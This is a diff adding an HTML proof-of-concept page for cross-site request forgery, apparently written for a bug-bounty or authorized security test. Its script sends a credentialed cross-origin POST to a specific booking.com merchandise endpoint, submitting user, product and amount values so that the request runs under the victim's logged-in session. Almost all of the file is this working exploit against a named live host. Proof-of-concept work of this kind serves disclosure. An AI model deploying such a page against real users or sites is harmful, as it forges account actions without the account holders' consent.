@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CSRF Security PoC</title>
+    <style>
+        body {
+            background: #10131a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: grid;
+            place-items: center;
+            min-height: 90vh;
+        }
+        .container {
+            background: #1d2330;
+            padding: 30px;
+            border-radius: 14px;
+            width: min(90%, 420px);
+        }
+        input, button {
+            box-sizing: border-box;
+            width: 100%;
+            padding: 13px;
+            margin-top: 12px;
+            border-radius: 7px;
+            border: 0;
+        }
+        button {
+            background: #8064e8;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        #status {
+            margin-top: 20px;
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>CSRF PoC</h2>
+    <p>Authorized security test demonstration.</p>
+
+    <label>Test User ID</label>
+    <input id="user" placeholder="Your authorized test user ID">
+
+    <label>Test Product ID</label>
+    <input id="product" value="2">
+
+    <label>Test Amount</label>
+    <input id="amount" value="1">
+
+    <button onclick="runPoC()">Run CSRF Test</button>
+
+    <div id="status">Waiting for user interaction...</div>
+</div>
+
+<script>
+async function runPoC() {
+    const status = document.getElementById("status");
+
+    const user = document.getElementById("user").value.trim();
+    const product = document.getElementById("product").value.trim();
+    const amount = document.getElementById("amount").value.trim();
+
+    if (!user || !product || !amount) {
+        status.textContent = "Please provide authorized test values.";
+        return;
+    }
+
+    status.textContent = "Sending cross-origin request...";
+
+    const body = new URLSearchParams({
+        amount: amount,
+        user: user,
+        product: product,
+        request_notes: "Authorized CSRF PoC",
+        type: "new"
+    });
+
+    try {
+        await fetch(
+            "https://1996.merchandise.booking.com/Products/register_interest",
+            {
+                method: "POST",
+                mode: "cors",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: body.toString()
+            }
+        );
+
+        status.textContent =
+            "Fetch completed. Verify the resulting state on the target.";
+
+    } catch (error) {
+        status.textContent =
+            "Fetch response was blocked or failed by browser CORS/network policy. " +
+            "Check the target state independently before concluding success.";
+    }
+}
+</script>
+</body>
+</html>
+
